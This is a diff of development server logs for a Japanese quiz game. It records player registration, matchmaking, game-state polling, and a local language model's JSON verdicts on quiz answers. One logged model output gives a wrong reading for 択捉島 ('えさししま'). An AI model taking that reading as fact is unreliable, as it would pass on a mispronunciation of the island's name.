@@ -1,663 +1,475 @@
 INFO:     Will watch for changes in these directories: ['/home/rinta/Documents/Rush-Maximizer']
 INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
-INFO:     Started reloader process [10110] using WatchFiles
-INFO:     Started server process [10113]
+INFO:     Started reloader process [39107] using WatchFiles
+INFO:     Started server process [39110]
 INFO:     Waiting for application startup.
 INFO:     Application startup complete.
 Successfully loaded 88 questions from /home/rinta/Documents/Rush-Maximizer/backend/src/data/questions.json
 CORS configured: allow_origins=[*] (development permissive)
 Serving BGM files from: /home/rinta/Documents/Rush-Maximizer/bgm
 Serving frontend from: /home/rinta/Documents/Rush-Maximizer/frontend at /_frontend
-INFO:     127.0.0.1:45860 - "GET /status HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44370 - "GET /status HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44370 - "OPTIONS /probe_lm HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44370 - "POST /probe_lm HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44370 - "OPTIONS /register HTTP/1.1" 200 OK
-player registered: 06d640dd-87df-40d3-920f-5a8cf3dec902 -> sss (token=3fe8c6a5)
-INFO:     122.103.96.209:44370 - "POST /register HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44370 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44384 - "GET /status HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44384 - "OPTIONS /probe_lm HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44384 - "POST /probe_lm HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44384 - "OPTIONS /register HTTP/1.1" 200 OK
-player registered: 35edbb57-282f-43b1-8b76-af6c08544b2b -> s (token=17075db6)
-INFO:     122.103.96.209:44384 - "POST /register HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44384 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /status HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "OPTIONS /probe_lm HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "POST /probe_lm HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "OPTIONS /register HTTP/1.1" 200 OK
-player registered: 1d4791d9-2a8d-4b9f-8f0e-6d53a7c9f0b0 -> koko (token=32130447)
-INFO:     127.0.0.1:58372 - "POST /register HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "OPTIONS /lobby/join HTTP/1.1" 200 OK
-player 35edbb57-282f-43b1-8b76-af6c08544b2b in lobby for rule=classic, total waiting: 1
-INFO:     122.103.96.209:44388 - "POST /lobby/join HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "OPTIONS /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48844 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "OPTIONS /lobby/join HTTP/1.1" 200 OK
-player 06d640dd-87df-40d3-920f-5a8cf3dec902 in lobby for rule=classic, total waiting: 2
-INFO:     122.103.96.209:48844 - "POST /lobby/join HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "POST /lobby/join HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "OPTIONS /lobby/join HTTP/1.1" 200 OK
-player 1d4791d9-2a8d-4b9f-8f0e-6d53a7c9f0b0 in lobby for rule=classic, total waiting: 3
-created game 597b8728-2b9e-4d3a-b110-1fa88ca246ea for players ['35edbb57-282f-43b1-8b76-af6c08544b2b', '06d640dd-87df-40d3-920f-5a8cf3dec902', '1d4791d9-2a8d-4b9f-8f0e-6d53a7c9f0b0'] with rule classic and 10 questions
-INFO:     127.0.0.1:58372 - "POST /lobby/join HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /lobby/join HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48844 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "POST /lobby/join HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "OPTIONS /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45588 - "OPTIONS /heartbeat HTTP/1.1" 200 OK
-INFO:     127.0.0.1:58372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45588 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48858 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45588 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48858 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45588 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45588 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48858 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45588 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "OPTIONS /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /server/stats HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+INFO:     127.0.0.1:36350 - "GET /status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33964 - "GET /status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33964 - "OPTIONS /probe_lm HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33964 - "POST /probe_lm HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33964 - "OPTIONS /register HTTP/1.1" 200 OK
+player registered: b288c92c-59ca-4aa2-956a-8a30a1b98ad3 -> りん (token=1de9938c)
+INFO:     127.0.0.1:33964 - "POST /register HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33964 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33978 - "GET /bgm/menu.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:33964 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33964 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51480 - "OPTIONS /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51496 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51480 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51480 - "GET /solo/questions?n=10 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51506 - "GET /bgm/count_down.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:51480 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51506 - "GET /bgm/fighting_bgm.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:45834 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45834 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45838 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45838 - "OPTIONS /ask_ai HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "本能寺の変", "reasoning": "信長が殺された出来事は「本能寺の変」です。これは1582年に織田信長が明智光秀によって暗殺された事件で、日本の歴史において重要な出来事です。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確であり、説明も適切です。"}
-INFO:     122.103.96.209:45372 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "OPTIONS /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48858 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44388 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48864 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45588 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:52570 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37580 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:52574 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:52578 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "水素", "reasoning": "元素記号 H は水素を表し、水素は原子番号1であり、最も軽い元素です。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で、理由も明確です。"}
+INFO:     127.0.0.1:45838 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45846 - "GET /bgm/seikai.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:45838 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45838 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38292 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38300 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38300 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:38300 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "本能寺の変", "reasoning": "信長が殺された出来事は「本能寺の変」です。これは1582年に織田信長が明智光秀によって暗殺された事件で、日本の歴史において重要な出来事とされています。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確であり、説明も適切です。"}
-INFO:     127.0.0.1:37586 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "OPTIONS /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/submit_answer HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37596 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48858 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45588 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37580 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:52570 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:52578 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:52574 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/submit_answer HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48884 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:45588 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "OPTIONS /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/submit_answer HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "POST /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/submit_answer HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "択捉島", "reasoning": "日本の最北端の島は択捉島（えさししま）です。これは北海道の北方に位置する島で、日本列島の最北端の地点とされています。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確であり、理由も明確です。"}
+INFO:     127.0.0.1:38300 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48606 - "GET /bgm/huseikai.mp3 HTTP/1.1" 206 Partial Content
+INFO:     127.0.0.1:38300 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48610 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48610 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48610 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49382 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49390 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "セキュリティソフト", "reasoning": "セキュリティのためのソフトは一般的に「セキュリティソフト」と呼ばれます。これはウイルス対策、ファイアウォール、不正アクセス防止などの機能を持つソフトウェアです。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は適切で、セキュリティソフトの定義も正確です。"}
-INFO:     122.103.96.209:45372 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:57132 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36384 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:57116 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/submit_answer HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:57132 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36384 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36384 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "織田信長", "reasoning": "本能寺の変は1582年に起こった事件で、織田信長が明智光秀によって暗殺されました。この出来事は日本の歴史において重要な転換点となりました。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確であり、説明も適切です。"}
+INFO:     127.0.0.1:49382 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49390 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49390 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49390 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59076 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59076 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59076 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "アンチウイルスソフト", "reasoning": "コンピュータウイルスを防ぐために一般的に使用されるソフトウェアはアンチウイルスソフトです。このソフトは、マルウェアやウイルスの検出・削除を行う機能を持っています。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で簡潔であり、技術的な説明も適切です。"}
-INFO:     127.0.0.1:48348 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36384 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48880 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48360 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:57132 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48360 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48360 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48360 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "ランドセルを作ったヒト", "reasoning": "この文は質問ではなく、単なる主語です。クイズとして評価するには不十分です。", "valid": false, "invalid_reason": "入力が質問や問題として不適切であり、評価が困難です。", "score": 0, "feedback": "この文は質問ではなく、評価可能な形式ではありません。クイズやコード添削の目的に合った入力をご提供ください。"}
+INFO:     127.0.0.1:59076 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59076 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46232 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59076 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59076 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59076 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58632 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58632 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58632 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "HTML", "reasoning": "Webページを作成するための基本的な言語はHTML（HyperText Markup Language）です。HTMLはウェブページの構造とコンテンツを定義するために使用されます。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は適切で、HTMLがWebページ作成の基本であることを正しく説明しています。"}
-INFO:     122.103.96.209:45372 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36384 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48360 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:57132 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:37586 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46578 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46574 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     127.0.0.1:53410 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36350 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36384 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48360 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
